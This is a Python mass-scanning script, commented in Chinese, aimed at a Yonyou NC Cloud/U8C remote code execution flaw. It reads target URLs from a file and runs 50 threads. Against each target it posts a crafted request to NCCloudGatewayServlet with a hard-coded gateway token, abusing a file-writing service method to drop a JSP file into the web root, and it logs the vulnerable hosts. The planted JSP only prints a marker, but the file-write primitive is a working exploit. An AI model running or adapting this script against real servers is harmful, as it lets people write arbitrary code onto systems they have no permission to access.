import requests
import threading
import json
import random
import string
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib3
import os

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def generate_random_string(length=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def generate_payload_data(rand_str):
    jsp_content = '<% out.println("YONYOU_RCE_VULN_{}"); %>'.format(rand_str)
    jsp_bytes = [ord(c) for c in jsp_content]  
    #payload
    data = {
        "groupCode": "1002",
        "user": "1002",
        "serviceInfo": {
            "serviceClassName": "nc.itf.uap.pfxx.IPFxxFileService",
            "serviceMethodName": "writeDocToXMLFile",
            "serviceMethodArgInfo": [
                {
                    "argType": {
                        "body": "java.lang.Byte"
                    },
                    "argValue": {
                        "body": jsp_bytes
                    },
                    "agg": False,
                    "isArray": True,
                    "isPrimitive": True
                },
                {
                    "argType": {
                        "body": "java.lang.String"
                    },
                    "argValue": {
                        "body": "./webapps/u8c_web/{}.jsp".format(rand_str)
                    },
                    "agg": False,
                    "isArray": False,
                    "isPrimitive": False
                }
            ]
        }
    }
    return data

def check_vulnerability(url):
    try:
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url

        rand_str = generate_random_string()
        payload_data = generate_payload_data(rand_str)

        headers = {
            "Accept-Encoding": "gzip, deflate, br",
            "Accept": "*/*",
            "Accept-Language": "en-US;q=0.9,en;q=0.8",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Cache-Control": "max-age=0",
            "gatewaytoken": "TJ6RT-3FVCB-DPYP8-XF7QM-96FV3",
            "Content-Type": "application/json"
        }

        response = requests.post(
            url + '/service/NCCloudGatewayServlet',
            headers=headers,
            json=payload_data,
            verify=False,
            allow_redirects=False,
            timeout=15
        )

        if 300 <= response.status_code < 400:
            print(f"[INFO] {url} - 状态码 {response.status_code} (重定向)，漏洞不存在")
            return None
        
        elif response.status_code == 200:
            response_text = response.text
            if ('retObj' in response_text and 
                'path' in response_text and 
                'File' in response_text):
                print(f"[VULNERABLE] {url} - 漏洞存在!")

                jsp_filename = None
                import re
                match = re.search(r'"path":"\\.\\\\webapps\\\\u8c_web\\\\([^"]+)\\.jsp"', response_text)
                if match:
                    jsp_filename = match.group(1)
                
                return {
                    'url': url,
                    'status_code': response.status_code,
                    'response_content': response_text[:300],  # 只取前300字符
                    'jsp_filename': jsp_filename,
                    'random_str': rand_str
                }
            else:
                print(f"[INFO] {url} - 状态码 200，但响应不满足漏洞条件")
                return None
        else:
            print(f"[INFO] {url} - 状态码 {response.status_code}，漏洞不存在")
            return None
            
    except requests.exceptions.RequestException as e:
        print(f"[ERROR] {url} - 请求失败: {str(e)}")
        return None
    except Exception as e:
        print(f"[ERROR] {url} - 发生错误: {str(e)}")
        return None

def main():

    if not os.path.exists('url.txt'):
        print("[ERROR] url.txt文件不存在!")
        return

    with open('url.txt', 'r', encoding='utf-8') as f:
        urls = [line.strip() for line in f if line.strip()]
    
    if not urls:
        print("[INFO] url.txt中没有找到有效的URL")
        return
    
    print(f"[INFO] 开始检测 {len(urls)} 个URL，线程数: 50")
    print(f"[INFO] 漏洞ID: yongyou-ncloud-NCCloudGatewayServlet-rce")
    print(f"[INFO] 严重性: critical")
    
    vulnerable_results = []

    with ThreadPoolExecutor(max_workers=50) as executor:

        future_to_url = {executor.submit(check_vulnerability, url): url for url in urls}

        for future in as_completed(future_to_url):
            result = future.result()
            if result:
                vulnerable_results.append(result)
    
    if vulnerable_results:
        with open('result.txt', 'w', encoding='utf-8') as f:
            f.write("yongyou-ncloud-NCCloudGatewayServlet-rce 漏洞检测结果\n")
            f.write("=" * 60 + "\n\n")
            
            for i, result in enumerate(vulnerable_results, 1):
                f.write(f"漏洞 #{i}:\n")
                f.write(f"URL: {result['url']}\n")
                f.write(f"状态码: {result['status_code']}\n")
                f.write(f"随机字符串: {result['random_str']}\n")
                if result['jsp_filename']:
                    f.write(f"JSP文件名: {result['jsp_filename']}\n")
                
                f.write("响应内容(前300字符):\n")
                f.write(result['response_content'])
                f.write("\n" + "-" * 40 + "\n\n")
        
        print(f"\n[SUCCESS] 发现 {len(vulnerable_results)} 个存在漏洞的URL，详情已写入 result.txt")

        print("\n漏洞总结:")
        for result in vulnerable_results:
            print(f"  - {result['url']} (随机字符串: {result['random_str']})")
            
    else:
        print(f"\n[INFO] 未发现存在漏洞的URL")

if __name__ == "__main__":
    main()